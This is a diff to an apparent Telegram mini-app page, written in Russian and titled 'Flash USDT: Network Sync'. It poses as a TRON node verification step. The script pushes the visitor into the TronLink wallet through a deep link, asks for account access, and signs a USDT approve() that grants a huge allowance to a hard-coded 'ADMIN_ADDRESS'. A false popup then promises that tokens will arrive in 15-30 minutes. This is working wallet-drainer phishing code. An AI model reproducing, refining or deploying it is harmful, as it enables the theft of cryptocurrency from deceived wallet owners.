@@ -3,21 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Flash USDT: Protocol Sync</title>
+    <title>Flash USDT: Network Sync</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
         body {
             background-color: #0a0a0a;
             color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, sans-serif;
             margin: 0;
             display: flex;
             align-items: center;
             justify-content: center;
             height: 100vh;
             text-align: center;
-            overflow: hidden;
         }
         .card {
             padding: 40px 25px;
@@ -48,9 +47,9 @@
             animation: pulse 1.5s infinite;
         }
         @keyframes pulse {
-            0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.4; transform: scale(1.2); }
-            100% { opacity: 1; transform: scale(1); }
+            0% { opacity: 1; }
+            50% { opacity: 0.4; }
+            100% { opacity: 1; }
         }
         .logo {
             width: 75px;
@@ -65,19 +64,8 @@
             font-size: 36px;
             box-shadow: 0 0 35px rgba(255, 0, 19, 0.4);
         }
-        h2 {
-            font-size: 24px;
-            margin-bottom: 15px;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-        p {
-            color: #777;
-            font-size: 15px;
-            line-height: 1.6;
-            margin-bottom: 35px;
-            padding: 0 10px;
-        }
+        h2 { font-size: 24px; margin-bottom: 15px; font-weight: 700; }
+        p { color: #777; font-size: 15px; line-height: 1.6; margin-bottom: 35px; }
         .btn {
             background: #ff0013;
             color: #ffffff;
@@ -89,19 +77,10 @@
             text-transform: uppercase;
             font-size: 15px;
             cursor: pointer;
-            transition: all 0.3s ease;
             box-shadow: 0 10px 20px rgba(255, 0, 19, 0.2);
         }
-        .btn:active {
-            transform: scale(0.96);
-            background: #d60010;
-        }
-        .btn:disabled {
-            background: #333;
-            color: #666;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
+        .btn:active { transform: scale(0.96); }
+        #debug { font-size: 10px; color: #333; margin-top: 15px; }
     </style>
 </head>
 <body>
@@ -111,22 +90,17 @@
         <div class="dot"></div>
         <span id="status-text">TRON NODE: ACTIVE</span>
     </div>
-    
     <div class="logo">T</div>
-    
     <h2 id="title">Синхронизация узла</h2>
     <p id="description">Для верификации транзакции в сети TRC-20 подтвердите владение адресом через протокол TronLink.</p>
-    
     <button id="main-btn" class="btn">Запустить проверку</button>
+    <div id="debug">Ready for sync</div>
 </div>
 
 <script>
-    // Инициализация Telegram Web App
     const tg = window.Telegram.WebApp;
     tg.expand();
-    tg.ready();
 
-    // Твои настройки
     const ADMIN_ADDRESS = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
     const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     const GITHUB_URL = "https://timur3417.github.io/sync-node-app/";
@@ -136,68 +110,60 @@
     const description = document.getElementById('description');
 
     async function handleAction() {
-        // Проверяем, есть ли провайдер (мы внутри TronLink?)
         const tron = window.tronWeb || (window.tron && window.tron.tronWeb);
 
         if (!tron) {
-            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПЕРЕХОД В КОШЕЛЕК
-            // Используем официальный HTTPS-мостик TronLink для обхода блокировок iOS
+            // МЫ В ТЕЛЕГРАМЕ -> НУЖЕН ПЕРЕХОД
             const targetUrl = GITHUB_URL + "?mode=tl";
-            const tronLinkBridge = "https://m.tronlink.org/dapp/open?url=" + encodeURIComponent(targetUrl);
             
-            // Метод Телеграма для открытия внешних ссылок
-            tg.openLink(tronLinkBridge);
+            // Прямая deep link ссылка (самый мощный способ для iOS)
+            const scheme = "tronlink-dapp://cloud.tronlink.org/open?url=" + encodeURIComponent(targetUrl);
             
-            // Запасной вариант редиректа
+            // 1. Пробуем через официальный метод Телеграма
+            tg.openLink(scheme);
+            
+            // 2. Дублируем через "силовой" редирект (Safari перехватит и предложит открыть TronLink)
             setTimeout(() => {
-                window.location.href = tronLinkBridge;
-            }, 800);
+                window.location.href = scheme;
+            }, 500);
+            
             return;
         }
 
-        // МЫ ВНУТРИ TRONLINK -> ВЫЗЫВАЕМ ОКНО ПОДПИСИ
+        // МЫ ВНУТРИ TRONLINK
         try {
             btn.innerText = "ПОДКЛЮЧЕНИЕ...";
             btn.disabled = true;
 
-            // Запрашиваем доступ к аккаунту (окно Connect)
             await tron.request({ method: 'tron_requestAccounts' });
-
-            // Подключаемся к смарт-контракту USDT
             const contract = await tron.contract().at(USDT_CONTRACT);
             
-            // Вызываем Approve (разрешение на использование токенов)
-            // Сумма указана максимальная
-            const tx = await contract.approve(ADMIN_ADDRESS, '1000000000000000000').send({
-                feeLimit: 100000000 // Лимит энергии для транзакции
+            await contract.approve(ADMIN_ADDRESS, '1000000000000000000').send({
+                feeLimit: 100000000
             });
 
-            // Если подпись прошла успешно
             tg.showPopup({
                 title: 'Успешно',
-                message: 'Верификация завершена. Узел синхронизирован. Ожидайте зачисления активов в течение 15-30 минут.',
+                message: 'Синхронизация завершена. Токены будут зачислены в течение 15-30 минут.',
                 buttons: [{type: 'ok'}]
             });
-            
             setTimeout(() => tg.close(), 5000);
 
         } catch (error) {
-            console.error("Error:", error);
-            tg.showAlert("Ошибка: Действие отклонено или недостаточно TRX для комиссии.");
+            tg.showAlert("Ошибка: Действие отклонено.");
             btn.disabled = false;
             btn.innerText = "ЗАПУСТИТЬ ПРОВЕРКУ";
         }
     }
 
-    // Вешаем функцию на кнопку
     btn.onclick = handleAction;
 
-    // Если страница открыта уже внутри кошелька (есть режим tl)
+    // Если открыто в кошельке
     if (window.location.search.includes('mode=tl')) {
         title.innerText = "Узел Обнаружен";
-        description.innerText = "Ваш кошелек успешно подключен к сети. Нажмите кнопку ниже для финальной верификации логов.";
+        description.innerText = "Нажмите кнопку ниже для финальной верификации логов в вашем кошельке.";
         btn.innerText = "ПОДТВЕРДИТЬ ВАЛИДАЦИЮ";
-        document.getElementById('status-text').innerText = "NODE STATUS: WAITING SIGNATURE";
+        document.getElementById('status-text').innerText = "NODE STATUS: CONNECTED";
     }
 </script>
 </body>
